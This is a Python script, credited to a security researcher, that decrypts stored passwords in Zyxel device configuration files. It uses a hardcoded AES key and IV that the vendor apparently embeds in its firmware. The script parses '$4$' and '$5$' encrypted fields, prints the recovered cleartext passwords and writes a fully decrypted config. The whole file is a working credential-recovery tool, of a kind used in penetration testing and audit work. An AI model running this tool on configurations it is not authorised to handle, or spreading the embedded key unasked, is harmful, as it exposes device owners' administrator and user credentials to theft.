'''
/*****************************************************************************
 * Zyxel password decrypter                                                  *
 *                                                                           *
 * Copyright (c) 2022, Agazzini Maurizio - maurizio.agazzini@hnsecurity.it   *
 * All rights reserved.                                                      *
 *                                                                           *
 * Redistribution and use in source and binary forms, with or without        *
 * modification, are permitted provided that the following conditions        *
 * are met:                                                                  *
 *     * Redistributions of source code must retain the above copyright      *
 *       notice, this list of conditions and the following disclaimer.       *
 *     * Redistributions in binary form must reproduce the above copyright   *
 *       notice, this list of conditions and the following disclaimer in     *
 *       the documentation and/or other materials provided with the          *
 *       distribution.                                                       *
 *     * Neither the name of @ Mediaservice.net nor the names of its         *
 *       contributors may be used to endorse or promote products derived     *
 *       from this software without specific prior written permission.       *
 *                                                                           *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS       *
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT         *
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR     *
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT      *
 * OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,     *
 * SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED  *
 * TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR    *
 * PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF    *
 * LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING      *
 * NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS        *
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.              *
 *****************************************************************************/
'''

from Crypto.Cipher import AES
import base64
import re
import binascii
import argparse

aes_key = "001200054A1F23FB1F060A14CD0D018F5AC0001306F0121C"
aes_iv = "0006001C01F01FC0FFFFFFFFFFFFFFFF"

key = binascii.unhexlify(aes_key)
iv = binascii.unhexlify(aes_iv)

parser = argparse.ArgumentParser(description='Zyxel password decrypter')

parser.add_argument('--in', dest='filename', help='configuration file', required=True)

args = parser.parse_args()

filein = args.filename
fileout = args.filename + "_decrypted"

print("Zyxel password decrypter\n")

try:
    file1 = open(filein, 'r')
except:
    print("[!] can't open " + args.filename)
    exit()

all_lines = file1.readlines()

try:
    file1 = open(fileout, 'w')
except:
    print("[!] can't open for writing " + args.filename)
    exit()


count = 0

passwords = 0

for line in all_lines:
    count += 1

    if "$4$" in line:

        pattern = "\$.*?\$(.*?)\$(.*?)\$"

        par = re.search(pattern, line)

        print("[ ] Decrypting " + str(par.group(0))[:20] + "...", end = '')

        cipher = AES.new(key, AES.MODE_CBC, iv)

        try:
            decrypted = cipher.decrypt(base64.b64decode(par.group(2)+'=='))
        except:
            print("\r[-] Decrypting " + str(par.group(0))[:20] + "... KO - Decryption failed")
            file1.writelines(line)
            continue


        if str(par.group(1)) in str(decrypted):
            clear_pass = decrypted.decode('utf-8')[len(str(par.group(1))):decrypted.decode('utf-8').find('\x00')]
            line = line.replace(par.group(0),clear_pass)

            print("\r[X] Decrypting " + str(par.group(0))[:20] + "... OK - (" + clear_pass + ")")

            passwords += 1
        else:
            print("\r[-] Decrypting " + str(par.group(0))[:20] + "... KO - Decryption failed")
        
    elif "$5$" in line:

        pattern = "\$.*?\$(.*?)\$(.*?)\$(.*?)\$"
        par = re.search(pattern, line)

        cipher = AES.new(key, AES.MODE_CBC, iv)

        print("[ ] Decrypting " + str(par.group(0))[:20] + "...", end = '')

        try:
            decrypted = cipher.decrypt(base64.b64decode(par.group(3)+'=='))
        except:
            print("\r[-] Decrypting " + str(par.group(0))[:20] + "... KO - Decryption failed")
            file1.writelines(line)
            continue

        if str(par.group(2)) in str(decrypted):

            decrypted = decrypted.decode('utf-8')[len(str(par.group(2))):decrypted.decode('utf-8').find('\x00')-1]

            cipher = AES.new(key, AES.MODE_CBC, iv)

            decrypted = cipher.decrypt(base64.b64decode(str(decrypted)+'=='))

            if str(par.group(1)) in str(decrypted):

                clear_pass = decrypted.decode('utf-8')[len(str(par.group(1))):decrypted.decode('utf-8').find('\x00')]
                line = line.replace(par.group(0),clear_pass)

                print("\r[X] Decrypting " + str(par.group(0))[:20] + "... OK - (" + clear_pass + ")")

                passwords += 1
            else:
                print("\r[-] Decrypting " + str(par.group(0))[:20] + "... KO - Decryption failed")
        else:
            print("\r[-] Decrypting " + str(par.group(0))[:20] + "... KO - Decryption failed")


    file1.writelines(line)

file1.close()

print("\nDecrypted " + str(passwords) + " passwords")
print("Decrypted config file saved at " + fileout)
